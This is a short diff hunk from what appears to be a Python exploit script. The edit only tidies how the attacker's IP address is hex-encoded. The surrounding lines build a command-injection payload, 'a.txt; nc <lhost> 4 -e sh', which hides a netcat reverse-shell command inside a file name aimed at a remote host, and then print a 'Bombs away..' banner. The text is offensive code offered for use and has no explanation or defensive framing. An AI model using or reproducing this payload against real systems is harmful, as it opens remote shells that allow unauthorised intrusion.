@@ -52,8 +52,7 @@ try:
     rhost = sys.argv[2]
     hexed = binascii.hexlify(socket.inet_aton(lhost))
     lhost = str(hexed)
-    lhost = lhost.strip("b'")	# yes i know this is poorly written..
-    lhost = "0x" + lhost
+    lhost = "0x" + lhost.strip("b'")	# yes i know this is poorly written..
     payload = "a.txt; nc " + lhost + " 4 -e sh"
     banner()
     os.system("echo '\e[5mBombs away..\e[0m'")
